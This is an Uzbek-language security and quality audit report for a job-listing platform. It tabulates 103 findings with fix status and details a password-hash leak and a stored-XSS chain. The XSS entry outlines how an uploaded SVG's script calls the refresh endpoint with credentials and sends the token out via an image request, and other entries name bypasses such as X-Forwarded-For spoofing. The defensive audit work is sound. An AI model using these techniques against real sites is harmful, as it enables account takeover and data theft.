# ISSUES — ISH BOR! audit (2026-09-14)

Bu fayl `render_issues.py` bilan birlashtirish xaritasi va xom topilmalardan generatsiya qilinadi. Xom topilmalar (271 ta, fayl:qator va to'liq matn bilan): `docs/audit/raw/findings-initial.json`.

## Usul

- 15 ta audit yo'nalishi parallel agentlar tomonidan faqat o'qish rejimida tekshirildi: auth, authz/IDOR, validation/errors, DB/performance, security surface, realtime/notifications, frontend state, monetization, routing/SEO, i18n, responsive/dark/a11y, employer, candidate/public, 10K data scale, tests/infra.
- 271 ta xom topilma lead auditor tomonidan qo'lda root cause bo'yicha birlashtirildi. Severity dalilga qarab qayta baholandi, o'zgarishlar izohda ko'rsatilgan.
- Eng xavflilari izolyatsiyalangan test bazasi (`ishbor_e2etest`) ustidagi alohida API nusxasida empirik qayta hosil qilindi. Demo va dev ma'lumotlarga tegilmadi.
- Verdict: `CONFIRMED-E` — empirik; `CONFIRMED-C` — kod o'qib tasdiqlangan; `PLAUSIBLE` — agent topgan, mustaqil tekshirilmagan.
- Severity: P0 — xavfsizlik, ma'lumot yo'qotish yoki production blocker; P1 — asosiy funksional yoki product rule buzilishi; P2 — performance, maintainability yoki UX; P3 — polish.

## Xulosa

| Severity | Xom topilmalar | Noyob muammolar |
|---|---|---|
| P0 | 16 | 5 |
| P1 | 52 | 21 |
| P2 | 138 | 52 |
| P3 | 65 | 25 |
| Jami | 271 | 103 |

| Holat | Soni |
|---|---|
| FIXED | 62 |
| NOT FIXED | 18 |
| NOT REPRODUCIBLE | 1 |
| PARTIAL | 19 |
| WONT FIX | 3 |

## Barcha muammolar

| ID | Sev | Holat | Area | Sarlavha |
|---|---|---|---|---|
| [ISSUE-001](#issue-001) | P0 | FIXED | security/data-leak | Ish beruvchi vakansiya arizalarini so'raganda nomzodning parol hashi, telegramChatId va barcha ichki maydonlari qaytadi (GET /api/vacancies/:id/applications) |
| [ISSUE-002](#issue-002) | P0 | FIXED | security/xss | Kompaniya logosi sifatida SVG qabul qilinadi va API domenidan skript bilan beriladi: stored XSS, refresh cookie orqali hisobni egallash; /uploads/ da xavfsizlik sarlavhalari yo'q |
| [ISSUE-003](#issue-003) | P0 | FIXED | security/availability | Bitta noto'g'ri WebSocket xabari (conversationId formati xato) unhandled rejection bilan butun API jarayonini yiqitadi |
| [ISSUE-004](#issue-004) | P0 | FIXED | security/cors | CORS har qanday *.vercel.app manziliga credentials bilan ruxsat beradi: begona Vercel sayti refresh cookie orqali access token oladi |
| [ISSUE-005](#issue-005) | P0 | FIXED | security/xss | JSON-LD ichida JSON.stringify '</script>' ni escape qilmaydi: ish beruvchi kiritgan vakansiya sarlavhasi orqali SSR HTML'da stored XSS |
| [ISSUE-006](#issue-006) | P1 | FIXED | authz/idor | Ariza yuborishda resumeId egaligi tekshirilmaydi: boshqa nomzodning rezyumesini o'z arizasiga biriktirib ish beruvchiga ochish mumkin |
| [ISSUE-007](#issue-007) | P1 | FIXED | monetization/product-rule | Nomzodlar bazasi bepul rejada 402 PLAN_FEATURE_LOCKED qaytaradi (product rule: platforma bepul); frontend buni 'nomzod topilmadi' deb ko'rsatadi; e2e esa 402 ni talab qiladi |
| [ISSUE-008](#issue-008) | P1 | FIXED | privacy | Nomzodlar qidiruvi har qanday ro'yxatdan o'tgan ish beruvchiga barcha 'ish qidirayotgan' nomzodlarning email va telefonini beradi; zod/sahifalash yo'q, noto'g'ri region 500 |
| [ISSUE-009](#issue-009) | P1 | FIXED | security/auth | JWT sirlari uchun minimal 8 belgi, algoritm pin qilinmagan, access/refresh token turi ajratilmagan |
| [ISSUE-010](#issue-010) | P1 | FIXED | security/auth | Telegram orqali kirish: deep-link bosilishi bilan bot tasdiqsiz sessiya beradi — bir klikli phishing orqali hisobni egallash |
| [ISSUE-011](#issue-011) | P1 | PARTIAL | security/rate-limit | trustProxy:true bilan X-Forwarded-For soxtalashtirilsa login/register brute-force limiti chetlab o'tiladi; email bo'yicha himoya yo'q |
| [ISSUE-012](#issue-012) | P1 | NOT FIXED | auth/core-hole | Parolni tiklash va parolni o'zgartirish oqimi umuman yo'q (login'dagi havola /support ga olib boradi) |
| [ISSUE-013](#issue-013) | P1 | FIXED | reliability | void notify() catch'siz chaqiriladi va global unhandledRejection handler yo'q: bildirishnoma yozishdagi DB xatosi jarayonni yiqitishi mumkin |
| [ISSUE-014](#issue-014) | P1 | FIXED | notifications | notify() ga payload berilganda url bazaga yozilmaydi: ariza va obuna bildirishnomalari ro'yxatda havolasiz qoladi |
| [ISSUE-015](#issue-015) | P1 | FIXED | product/no-fake-data | To'qima raqamlar: kirish panelidagi 12 000+/6 000+/300 000+, kategoriya kartalaridagi qattiq yozilgan sonlar, ish beruvchi landingidagi 3204+/48000+ va bajarilmaydigan va'dalar |
| [ISSUE-016](#issue-016) | P1 | FIXED | ux/empty-vs-error | Bosh sahifa SSR'da API xatosi '0 vakansiya / 0 kompaniya' va bo'sh bloklar sifatida ko'rinadi; statistikaga '+' qo'shiladi |
| [ISSUE-017](#issue-017) | P1 | FIXED | data-loss | GET /api/resume xatosi 'rezyume yo'q' deb qabul qilinadi: keyingi bo'lim saqlanishi (PUT butun hujjat) tajriba/ta'lim/ko'nikmalarni o'chirib yuboradi; load va saqlash navbati poygasi |
| [ISSUE-018](#issue-018) | P1 | FIXED | data-loss | Kompaniya profili yuklanmasa bo'sh forma chiziladi, saqlansa mavjud kompaniya ma'lumotlari null bilan ustidan yoziladi |
| [ISSUE-019](#issue-019) | P1 | FIXED | frontend/state | Har 12 daqiqalik token yangilanishida /profile skeletga qaytadi (saqlanmagan qoralama yo'qoladi), /messages ro'yxati va ochiq suhbat qayta yuklanadi, WS qayta ulanadi |
| [ISSUE-020](#issue-020) | P1 | FIXED | frontend/auth | 401 uchun refresh+qayta urinish yo'q; tarmoq xatosi 'mehmon' holatiga aylanadi va token o'chiriladi; mount va login() poygasi |
| [ISSUE-021](#issue-021) | P1 | FIXED | ux/empty-vs-error | Admin ro'yxat sahifalari API xatosini bo'sh jadval deb ko'rsatadi, eski javob yangisini yozadi, amal xatolari yutiladi; overview xatoda abadiy skeletda |
| [ISSUE-022](#issue-022) | P1 | FIXED | ux/empty-vs-error | /alerts, profil 'Saqlanganlar' va sevimlilar ID'lari API xatosini bo'sh holat deb ko'rsatadi |
| [ISSUE-023](#issue-023) | P1 | FIXED | frontend/state | Nomzodlar sahifasi: qidiruv so'rovlari poygasi, xato 'nomzod yo'q' bo'lib ko'rinadi, 'Xabar yozish' takroriy bosishdan himoyalanmagan |
| [ISSUE-024](#issue-024) | P1 | FIXED | employer/vacancy-flow | Rad etilgan vakansiyadan chiqish yo'li yo'q: tahrirlash holatni o'zgartirmaydi, PATCH rejected'dan o'tishga ruxsat bermaydi |
| [ISSUE-025](#issue-025) | P1 | FIXED | data-loss | Vakansiyani o'chirish nomzodlarning arizalari, holat tarixi va saqlanganlarini cascade bilan jimgina o'chiradi |
| [ISSUE-026](#issue-026) | P1 | WONT FIX | infra/git | server.ts import qiladigan yangi modullar (support, team, articles.*, vacancies.rules) git'da untracked: HEAD'dan build/deploy yiqiladi |
| [ISSUE-027](#issue-027) | P2 | FIXED | moderation | Admin rad etgan sharh muallif tahrirlaganda yana 'approved' bo'ladi (moderatsiyani chetlab o'tish) |
| [ISSUE-028](#issue-028) | P2 | WONT FIX | infra/deploy | prestart har prod start'da prisma db push qiladi: destruktiv sxema o'zgarishida crash-loop, listen'dan oldin indeks build |
| [ISSUE-029](#issue-029) | P2 | PARTIAL | privacy/uploads | Nomzod PDF rezyumesi /uploads/ da autentifikatsiyasiz, nomi userId+timestamp; o'chirish va qayta yuklash eski faylni diskdan o'chirmaydi; prod'da UPLOAD_DIR bo'sh bo'lsa jim |
| [ISSUE-030](#issue-030) | P2 | FIXED | security/logging | Fastify logger WS access tokenini (?token=) va staff invite tokenini URL bilan logga yozadi |
| [ISSUE-031](#issue-031) | P2 | FIXED | api/validation | Noto'g'ri formatdagi :id bilan ~25 endpoint Prisma P2023 → 500 qaytaradi |
| [ISSUE-032](#issue-032) | P2 | FIXED | privacy/response | Ochiq API (vakansiya ro'yxati/detail/similar, /api/companies/:slug, OG) kompaniyaning ichki maydonlarini qaytaradi: ownerUserId, stir, legalName, subscriptionPlanId/ExpiresAt |
| [ISSUE-033](#issue-033) | P2 | FIXED | privacy/salary | Yashirilgan maosh (isSalaryHidden) ochiq API javoblarida raqam bilan qaytadi — faqat frontend yashiradi |
| [ISSUE-034](#issue-034) | P2 | FIXED | seo/privacy | OG rasm draft/rejected/archived vakansiya uchun ham chiziladi, yashirilgan maoshni ko'rsatadi va 'immutable' keshlanadi |
| [ISSUE-035](#issue-035) | P2 | FIXED | authz | Admin yo'llari tokendagi rolga ishonadi (requireRole); roli olingan yoki bloklangan foydalanuvchi 15 daqiqa davomida API va ochiq WS'dan foydalanaveradi |
| [ISSUE-036](#issue-036) | P2 | FIXED | employer/applications | Ariza holati: bir xil holat takror yuborilsa har safar tarix va bildirishnoma yaratiladi; holat mashinasi yo'q |
| [ISSUE-037](#issue-037) | P2 | FIXED | data-integrity | Ish beruvchi ikkinchi kompaniya yarata oladi (POST /api/companies tekshirmaydi, javascript: website), hamma joyda orderBy'siz findFirst |
| [ISSUE-038](#issue-038) | P2 | FIXED | authz/content | Sevimlilarga draft/moderation/rejected vakansiyani qo'shib, uning mazmunini GET /api/favorites orqali o'qish mumkin |
| [ISSUE-039](#issue-039) | P2 | FIXED | privacy/chat | Ish beruvchi ariza bermagan va ish qidirmayotgan nomzodga ham suhbat ochadi, keyin /api/users/:id/summary orqali profilini ko'radi |
| [ISSUE-040](#issue-040) | P2 | FIXED | security/websocket | WebSocket: maxPayload 100 MB, xabar rate-limit yo'q, blok holati va token muddati tekshirilmaydi, heartbeat yo'q, tana turi tekshirilmaydi |
| [ISSUE-041](#issue-041) | P2 | FIXED | security/session | Refresh token server tomonda bekor qilinmaydi: logout'dan keyin eski cookie yangi token beradi |
| [ISSUE-042](#issue-042) | P2 | PARTIAL | security/auth | Email tasdiqlanmaydi; Google login email bo'yicha mavjud (tasdiqlanmagan) hisobga birlashadi — pre-account takeover |
| [ISSUE-043](#issue-043) | P2 | FIXED | security/uploads | Yuklash endpointlarida alohida rate-limit yo'q, fayl turi faqat client sarlavhasidan (magic bytes yo'q), multipart bo'lmagan so'rov 406 |
| [ISSUE-044](#issue-044) | P2 | FIXED | api/validation | Satr uzunliklari (title, description, password, ism, coverLetter, qidiruv matni) va sonlar (Infinity) cheklanmagan; rezyume massivlari cheksiz |
| [ISSUE-045](#issue-045) | P2 | PARTIAL | scale/api | GET /api/employer/applications chegarasiz: relation-filter $lookup, har arizaga to'liq rezyume; filtr va sahifalash client'da |
| [ISSUE-046](#issue-046) | P2 | PARTIAL | scale/chat | Suhbatlar va xabarlar ro'yxati chegarasiz; /api/inbox/summary har 20 soniyada indekssiz count va relation filter; ochilgan suhbatlar client'da cheksiz keshlanadi |
| [ISSUE-047](#issue-047) | P2 | FIXED | scale/api | GET /api/companies/:slug barcha faol vakansiyalarni (to'liq tavsif bilan) va barcha sharhlarni chegarasiz qaytaradi |
| [ISSUE-048](#issue-048) | P2 | PARTIAL | scale/search | Vakansiya ro'yxati: saralash indeksga tushmaydi, har kartaga to'liq kompaniya, count alohida skan; facets 7 ta aggregation va 2000 kompaniya lookup; regex matn qidiruvi |
| [ISSUE-049](#issue-049) | P2 | PARTIAL | scale/companies | Kompaniyalar katalogi har so'rovda barcha mos kompaniyalar uchun 2 ta $lookup'ni saralashdan oldin hisoblaydi |
| [ISSUE-050](#issue-050) | P2 | FIXED | product/workplace | Kompaniya katalogidagi 'remote/office' filtri faqat employmentType'ga qaraydi, yangi workplaceType maydonini e'tiborsiz qoldiradi |
| [ISSUE-051](#issue-051) | P2 | FIXED | scale/stats | Maosh statistikasi har so'rovda 20 000 tagacha faol vakansiyani xotiraga o'qiydi, kesh yo'q |
| [ISSUE-052](#issue-052) | P2 | FIXED | scale/stats | Ochiq /api/stats har bosh sahifada indekssiz application.count qiladi, kesh yo'q, 'bugun' UTC bo'yicha; admin overview ham indekssiz |
| [ISSUE-053](#issue-053) | P2 | FIXED | scale/db | Real so'rovlarga mos indekslar yetishmaydi: Application.createdAt, [vacancyId,status]; Vacancy [status,isPremium,publishedAt], [companyId,status]; Notification [userId,createdAt]; Message [conversationId,isRead]; User.createdAt |
| [ISSUE-054](#issue-054) | P2 | FIXED | scale/notifications | Admin broadcast barcha foydalanuvchilarga bitta HTTP so'rov ichida ketma-ket notify() qiladi; url '//host' tekshirilmaydi |
| [ISSUE-055](#issue-055) | P2 | FIXED | scale/alerts | Alerts sweep chegarasiz, reentrancy guard yo'q (parallel ishga tushsa dublikat bildirishnoma), har obuna uchun keraksiz count |
| [ISSUE-056](#issue-056) | P2 | PARTIAL | seo/sitemap | Sitemap'lar keshsiz, kompaniyalar filtrsiz (bo'sh profillar ham), orderBy yo'q |
| [ISSUE-057](#issue-057) | P2 | FIXED | seo/data | Vakansiya ko'rilganda viewsCount prisma.update bilan oshadi: updatedAt yangilanadi (sitemap lastmod buziladi), GET javobi yozishni kutadi |
| [ISSUE-058](#issue-058) | P2 | PARTIAL | scale/api | /api/employer/vacancies chegarasiz to'liq hujjatlar; tahrirlash sahifasi bitta vakansiya uchun butun ro'yxatni yuklaydi |
| [ISSUE-059](#issue-059) | P2 | FIXED | product/workplace | PATCH status→active kategoriya va ish joylashuvi qoidasini qayta tekshirmaydi: to'liq bo'lmagan eski yozuvlar qayta e'lon qilinadi |
| [ISSUE-060](#issue-060) | P2 | FIXED | realtime | Ariza holati izohi chatga to'g'ridan-to'g'ri DB yozuvi bo'lib tushadi (real-time push yo'q); bildirishnoma izohsiz ham /messages ga olib boradi |
| [ISSUE-061](#issue-061) | P2 | FIXED | search/meili | Meilisearch yo'lida DB'dan olingan qatorlar status bo'yicha qayta filtrlanmaydi; reindexAll deleteAll bilan bo'sh oraliq qoldiradi |
| [ISSUE-062](#issue-062) | P2 | PARTIAL | infra/config | .env.example'da NODE_ENV yo'q; lokal .env'da ishlatilmaydigan qoldiqlar; test:e2e eski dist'ni ishlatadi; ws faqat tranzitiv dependency |
| [ISSUE-063](#issue-063) | P2 | PARTIAL | tests | E2E: kritik authz yo'llari (summary, conversations/start, rating, saved-search IDOR, uploads, admin non-admin) testlanmagan; yetim server jarayoni; force-reset sharti substring 'test' |
| [ISSUE-064](#issue-064) | P2 | FIXED | monetization | Eski billing backend ochiq: istalgan employer pending Payment yarata oladi, webhook method/summani tekshirmaydi, bildirishnoma va return URL'lar /pricing'ga, ensurePlans har startda |
| [ISSUE-065](#issue-065) | P2 | FIXED | docs/monetization | README/DEPLOY/DESIGN tariflar, limit va /pricing'ni amaldagi funksiya deb yozadi |
| [ISSUE-066](#issue-066) | P2 | PARTIAL | frontend/routing | Login'da returnTo yo'q, rol guard'lari faqat client'da va redirect zanjirlari bor, rezyume holati xatoda noto'g'ri 'to'ldiring' deydi |
| [ISSUE-067](#issue-067) | P2 | FIXED | frontend/notifications | Qo'ng'iroq: ikkinchi WS reconnect'siz, xatoda son 0 ga tushadi, eskirgan javoblar holatni yozadi, badge takroriy +1 |
| [ISSUE-068](#issue-068) | P2 | FIXED | frontend/messages | useMessenger loadPartner/loadRating xatoda ushlanmaydi: panel 'loading'da qotadi |
| [ISSUE-069](#issue-069) | P2 | PARTIAL | ssr/resilience | SSR +data fetch'larida timeout yo'q: sekin API barcha ochiq sahifalarni osiltirib qo'yadi |
| [ISSUE-070](#issue-070) | P2 | NOT FIXED | seo/status | Detail sahifalarda (vakansiya/kompaniya/maqola) API xatosi HTTP 200 + noindex bilan qaytadi: vaqtinchalik nosozlik sahifani indeksdan chiqaradi |
| [ISSUE-071](#issue-071) | P2 | NOT FIXED | seo/canonical | Canonical va hreflang query param'larni tashlaydi: sitemap'dagi /salaries?category= URL'lari o'z canonical'iga zid; /vacancies?q= da noindex yo'q |
| [ISSUE-072](#issue-072) | P2 | PARTIAL | seo/jsonld | JobPosting: baseSalary valyutasi doim UZS, sameAs ichki sahifa, validThrough amalda yo'q |
| [ISSUE-073](#issue-073) | P2 | NOT FIXED | i18n | Backend o'zbekcha xato matnlari, zod inglizcha default xabarlari va o'zbekcha bildirishnoma matnlari RU/EN interfeysda xom ko'rinadi; hudud nomlari ba'zi joylarda tarjimasiz; 429 xabari inglizcha |
| [ISSUE-074](#issue-074) | P2 | FIXED | ui/navigation | Mobil menyu client-side navigatsiyadan keyin ochiq qolib ketadi |
| [ISSUE-075](#issue-075) | P2 | PARTIAL | a11y | A11y: qo'ng'iroq aria-label sonni yashiradi, popover'larda Esc yo'q, qidiruv inputlarida label yo'q, custom Select klaviaturasiz, StarInput semantikasi, dialoglarda overflow, skip link yo'q, fokus indikatori sust, drawer fokus tuzog'i nusxasi |
| [ISSUE-076](#issue-076) | P2 | NOT FIXED | a11y/contrast | Kontrast: text-dusk/80 kunduzgi rejimda 3.59:1, tungi text-signal 3.96:1, tungi bg-signal ustidagi oq matn 4.47:1 |
| [ISSUE-077](#issue-077) | P2 | NOT FIXED | a11y/motion | prefers-reduced-motion ataylab e'tiborsiz qoldirilgan: cheksiz fon animatsiyalarini to'xtatib bo'lmaydi |
| [ISSUE-078](#issue-078) | P2 | NOT FIXED | security/csp | Web (Vike) origin'ida Content-Security-Policy umuman yo'q |
| [ISSUE-079](#issue-079) | P3 | FIXED | infra/lifecycle | Shutdown'da Telegram bot sikli va alert timer to'xtatilmaydi, timeout yo'q; getMe bir marta yiqilsa bot restartgacha o'chiq |
| [ISSUE-080](#issue-080) | P3 | PARTIAL | monetization/cleanup | /pricing dead code, admin to'lovlar paneli va 'Daromad' kartasi, demo seed tarif/to'lov yozuvlari, bo'sh support 'payments' kategoriyasi; isPremium (admin qo'lda) product rule'ga mos |
| [ISSUE-081](#issue-081) | P3 | NOT FIXED | responsive | Responsive mayda: 100vh (dvh emas), tor sidebar sarlavhasida whitespace-nowrap, grid-cols-1 qoidasi, illyustratsiyalarning tungi varianti |
| [ISSUE-082](#issue-082) | P3 | FIXED | auth/google | Google tokeninfo so'rovida timeout yo'q (tarmoq xatosi 500), iss tekshirilmaydi |
| [ISSUE-083](#issue-083) | P3 | NOT FIXED | security/tradeoff | Access token localStorage'da (XSS bo'lsa 15 daqiqalik token o'g'irlanadi) — hujjatlashtirilgan tradeoff |
| [ISSUE-084](#issue-084) | P3 | FIXED | authz/push | POST /api/push/subscribe endpoint bo'yicha upsert boshqa foydalanuvchining obunasini o'ziga o'tkazadi |
| [ISSUE-085](#issue-085) | P3 | NOT FIXED | ui/home | Bosh sahifa vakansiya kartasida ish joylashuvi ko'rsatilmaydi |
| [ISSUE-086](#issue-086) | P3 | FIXED | api/race | find-then-create poygasi: parallel ariza yoki suhbat ochishda ikkinchi so'rov 409 oladi (idempotent 200 kutiladi) |
| [ISSUE-087](#issue-087) | P3 | PARTIAL | authz/phone | PUT va PATCH status vakansiyada requirePhoneVerified yo'q (POST'da bor) |
| [ISSUE-088](#issue-088) | P3 | FIXED | docs/design | DESIGN.md bilan farqlar: markViewed optimistik, 'Moderatsiyada' kartasi employer uchun erishib bo'lmaydigan holat |
| [ISSUE-089](#issue-089) | P3 | NOT FIXED | product/workplace | Masofaviy vakansiyani tahrirlashda regionId doim null yuboriladi; API yangi e'londa employmentType 'remote' ni hali qabul qiladi |
| [ISSUE-090](#issue-090) | P3 | PARTIAL | frontend/cleanup | Cleanup'siz setTimeout'lar, useClickOutside har renderda qayta obuna, useSalaryCatalogs cancel'siz va xatoda jim, useFavorites.toggle har o'zgarishda yangi identity va closure'dagi eski ids |
| [ISSUE-091](#issue-091) | P3 | NOT FIXED | i18n | i18n mayda: 404'da til almashtirish bosh sahifaga olib ketadi, raqamlar hamma tilda ru-RU, til cookie o'lik kod, terminologiya, 'so'm dan', chat timezone, toLocaleDateString, qattiq yozilgan placeholder'lar |
| [ISSUE-092](#issue-092) | P3 | FIXED | seo/robots | robots.txt'da mavjud bo'lmagan /dashboard, /account; noindex sahifalar bir vaqtda Disallow |
| [ISSUE-093](#issue-093) | P3 | NOT FIXED | seo/error | _error sahifasida maqola 404 va 500 uchun alohida meta yo'q; 404 sahifada hreflang chiqadi |
| [ISSUE-094](#issue-094) | P3 | FIXED | admin/links | Admin vakansiyalar jadvali faol bo'lmagan vakansiyaga ham ochiq sahifa havolasini beradi (404) |
| [ISSUE-095](#issue-095) | P3 | NOT FIXED | routing | /employer/@slug har qanday noma'lum segmentni /companies/<segment> ga 301 qiladi |
| [ISSUE-096](#issue-096) | P3 | PARTIAL | security/config | ADMIN_PASSWORD va boshqa sirlar uchun minimal tekshiruv yo'q; webhook sirlari timing-safe solishtirilmaydi |
| [ISSUE-097](#issue-097) | P3 | NOT REPRODUCIBLE | security/csrf | SameSite=None cookie bilan /api/auth/logout va /refresh cross-site oddiy POST'ga ochiq (logout CSRF — noqulaylik darajasida) |
| [ISSUE-098](#issue-098) | P3 | WONT FIX | security/escaping | Telegram/email HTML escape qamrovi tekshirildi va to'g'ri; renderEmail body parametri nomi xavfli ishlatishga yo'l qo'yadi |
| [ISSUE-099](#issue-099) | P3 | NOT FIXED | infra/build | API tsconfig moduleResolution 'Bundler' Node ESM runtime uchun kengaytmasiz importni ushlamaydi; support.routes.ts regex ichida xom control belgilar |
| [ISSUE-100](#issue-100) | P3 | NOT FIXED | infra/deploy | Vercel va self-hosted SSR farqlari: robots/sitemap proxy faqat Vercel'da, HSTS preload, includeFiles dist/** |
| [ISSUE-101](#issue-101) | P3 | NOT FIXED | tests | Playwright skriptlari (scripts/*.py) eskirgan URL, eski seed slug va qayd etilmagan dependency'ga tayanadi |
| [ISSUE-102](#issue-102) | P3 | FIXED | frontend/errors | setVacancyStatus/deleteVacancy/setApplicationStatus/deleteReview backend xabarini tashlab umumiy 'Xatolik' beradi |
| [ISSUE-103](#issue-103) | P3 | NOT FIXED | i18n/links | Email/Telegram/push havolalari til prefiksini yo'qotadi; sitemap origin (WEB_ORIGIN) va canonical origin (VITE_SITE_URL) ikki xil manba |

## Batafsil

### ISSUE-001

**Ish beruvchi vakansiya arizalarini so'raganda nomzodning parol hashi, telegramChatId va barcha ichki maydonlari qaytadi (GET /api/vacancies/:id/applications)**

- **Severity:** P0 (agent bahosi: P0, P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** security/data-leak
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:203`
- **Root cause:** `jobSeeker: { include: { jobSeekerProfile: true } }` — `select` emas, `include`. Prisma User modelining barcha skalyar maydonlari (passwordHash, telegramChatId, isBlocked, isEmailVerified...) javobga tushadi. Shu faylning 152–167-qatorlaridagi /api/employer/applications esa to'g'ri `select` ishlatadi. Frontend bu endpoint'ni chaqirmaydi (apps/web/src/lib grep: yo'q), lekin backend'da ochiq.
- **Impact:** Vakansiya egasi (yoki admin) o'z vakansiyasiga ariza yuborgan har bir nomzodning argon2 parol hash'i va Telegram chat ID'sini oladi. Hash offline brute-force'ga, chatId esa Telegram spam/identifikatsiyaga yo'l ochadi. Employer o'z arizachilari uchun buni ko'ra oladi — resurs egaligi tekshirilgan, lekin maydonlar chegaralanmagan.
- **Evidence:** applications.routes.ts:201-205: `include: { resume: true, jobSeeker: { include: { jobSeekerProfile: true } } }`; schema.prisma:164 `passwordHash String`, :173 `telegramChatId String?`.
- **Recommended fix:** `jobSeeker: { select: { id: true, email: true, phone: true, jobSeekerProfile: { select: { firstName, lastName, headline, avatarUrl, isOpenToWork, resumeUrl, region: { select: { name, slug } } } } } }` — /api/employer/applications (152–167) bilan bir xil whitelist. Yoki endpoint ishlatilmasa umuman olib tashlash. e2e-check.mjs ga `"passwordHash" in item.jobSeeker` bo'lmasligi tekshiruvini qo'shish.
- **Dependencies:** Yo'q. e2e-check.mjs:350 testi mavjud — unga maydon tekshiruvi qo'shiladi.
- **Risk:** Past — frontend endpoint'ni ishlatmaydi.
- **Lead auditor izohi:** Empirik: probe serverda jobSeeker.passwordHash = $argon2id... qaytdi.
- **Bajarilgan fix:** `/api/vacancies/:id/applications` aniq `select` whitelist (parol hashi, telegramChatId, blok holati qaytmaydi), 500 ta chegara.
- **Test/dalil:** e2e `[ISSUE-001]` PASS; PHASE 6: e2e `[ISSUE-001] [PHASE6-U34]` aniq kalitlar ro'yxati bilan PASS
- **Birlashtirilgan manbalar (5):**
  - R000 [authz-idor, P0] `apps/api/src/modules/applications/applications.routes.ts:203` — GET /api/vacancies/:id/applications nomzodning TO'LIQ User yozuvini (passwordHash, telegramChatId) qaytaradi
  - R002 [candidate-public, P0] `apps/api/src/modules/applications/applications.routes.ts:203` — GET /api/vacancies/:id/applications nomzodning passwordHash va telegramChatId'sini qaytaradi
  - R006 [data-scale, P0] `apps/api/src/modules/applications/applications.routes.ts:203` — GET /api/vacancies/:id/applications nomzodning passwordHash va telegramChatId maydonlarini qaytaradi
  - R007 [employer-product, P0] `apps/api/src/modules/applications/applications.routes.ts:203` — GET /api/vacancies/:id/applications nomzodning to'liq User yozuvini, jumladan passwordHash'ni qaytaradi
  - R113 [db-performance, P2] `apps/api/src/modules/applications/applications.routes.ts:201` — /api/vacancies/:id/applications — chegarasiz, `resume: true` + `jobSeekerProfile: true` (barcha maydonlar)

### ISSUE-002

**Kompaniya logosi sifatida SVG qabul qilinadi va API domenidan skript bilan beriladi: stored XSS, refresh cookie orqali hisobni egallash; /uploads/ da xavfsizlik sarlavhalari yo'q**

- **Severity:** P0 (agent bahosi: P0, P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** security/xss
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:19`
- **Root cause:** LOGO_MIME_EXT (15–20) `image/svg+xml` ni qabul qiladi, fayl o'zgarishsiz `/uploads/` ga yoziladi (139–141) va fastify-static orqali API origin'idan beriladi (server.ts:195). API CSP `scriptSrc: 'self' 'unsafe-inline'` (server.ts:151) — SVG ichidagi inline `<script>` to'g'ridan-to'g'ri ochilganda ishlaydi. Refresh cookie API domenida, path `/api/auth`, prod'da SameSite=None (auth.routes.ts:198–203); `POST /api/auth/refresh` cookie bilan yangi accessToken qaytaradi (235–249). Maqola muqovasi (articles.admin.routes.ts:101–105) ataylab SVG'ni rad etadi — bu yerda unutilgan.
- **Impact:** Har qanday employer (telefon tasdiqsiz, bepul ro'yxatdan o'tgan) zararli SVG yuklaydi; jabrlanuvchi (masalan admin) `https://api.../uploads/company-logo-*.svg` havolasini ochsa skript API origin'ida `fetch('/api/auth/refresh', {credentials:'include'})` orqali uning access tokenini oladi va `img` orqali (CSP imgSrc https:) tashqariga yuboradi. Hisob egallash zanjiri (admin ham).
- **Evidence:** companies.routes.ts:19 `"image/svg+xml": "svg"`; :141 `pipeline(data.file, fs.createWriteStream(dest))` — sanitizatsiya yo'q; server.ts:151 `scriptSrc: ["'self'", "'unsafe-inline'", ...]`; server.ts:195 `fastifyStatic { root: UPLOAD_DIR, prefix: "/uploads/" }`; auth.routes.ts:202 `path: "/api/auth"`.
- **Recommended fix:** Minimal: LOGO_MIME_EXT dan `image/svg+xml` ni olib tashlash (muqova bilan bir xil). Qo'shimcha himoya: `/uploads/` javoblariga `Content-Security-Policy: sandbox; default-src 'none'` va `X-Content-Type-Options: nosniff` (fastifyStatic `setHeaders`) — kelajakdagi har qanday fayl turi uchun. Mavjud .svg logolarni rasterga o'tkazish yoki o'chirish.
- **Dependencies:** Frontend logo yuklash formasi (accept atributi) — SVG'ni ro'yxatdan olib tashlash.
- **Risk:** Past — SVG logolar demo/seed'da bo'lsa ular yangilanadi.
- **Lead auditor izohi:** Empirik: skriptli SVG 200 bilan yuklandi, /uploads/ javobida <script> va CSP script-src 'unsafe-inline'.
- **Bajarilgan fix:** Logo/muqova/PDF `saveUpload()` — magic bytes, SVG rad, tasodifiy nom; `/uploads/` javoblarida `nosniff` + rasmga sandbox CSP. PHASE 6: CSP sandbox endi haqiqiy `Content-Type` bo'yicha (`;.pdf` bilan chetlab o'tish yopildi, ISSUE-106).
- **Test/dalil:** e2e `[ISSUE-002]` PASS (SVG 400, PNG nomli HTML 400, CSP sandbox, o'chirilgan fayl 404); PHASE 6: e2e `[PHASE6-V3]` PASS
- **Birlashtirilgan manbalar (6):**
  - R001 [authz-idor, P0] `apps/api/src/modules/companies/companies.routes.ts:19` — Kompaniya logosi sifatida SVG qabul qilinadi → API origin'da stored XSS → refresh cookie orqali access token o'g'irlash zanjiri
  - R005 [candidate-public, P0] `apps/api/src/modules/companies/companies.routes.ts:19` — SVG logo orqali API origin'da stored XSS: refresh cookie bilan accessToken o'g'irlanadi
  - R008 [employer-product, P0] `apps/api/src/modules/companies/companies.routes.ts:19` — Kompaniya logosi sifatida SVG qabul qilinadi va API origin'dan inline script'ga ruxsat bilan beriladi (stored XSS)
  - R010 [security-surface, P0] `apps/api/src/modules/companies/companies.routes.ts:19` — SVG logo yuklash + /uploads/ API origin'ida inline bo'lib ochiladi + CSP script-src 'unsafe-inline' → SVG ichidagi <script> refresh cookie bilan access token oladi (account takeover)
  - R013 [tests-infra, P0] `apps/api/src/modules/companies/companies.routes.ts:19` — Kompaniya logosi sifatida SVG qabul qilinadi va API origin'idan inline script'ga ruxsat bilan beriladi (stored XSS)
  - R187 [security-surface, P2] `apps/api/src/server.ts:107` — /uploads/ statik xizmatida xavfsizlik sarlavhalari (Content-Disposition, sandbox CSP) yo'q va mimetype faqat client sarlavhasidan

### ISSUE-003

**Bitta noto'g'ri WebSocket xabari (conversationId formati xato) unhandled rejection bilan butun API jarayonini yiqitadi**

- **Severity:** P0 (agent bahosi: P0, P1)
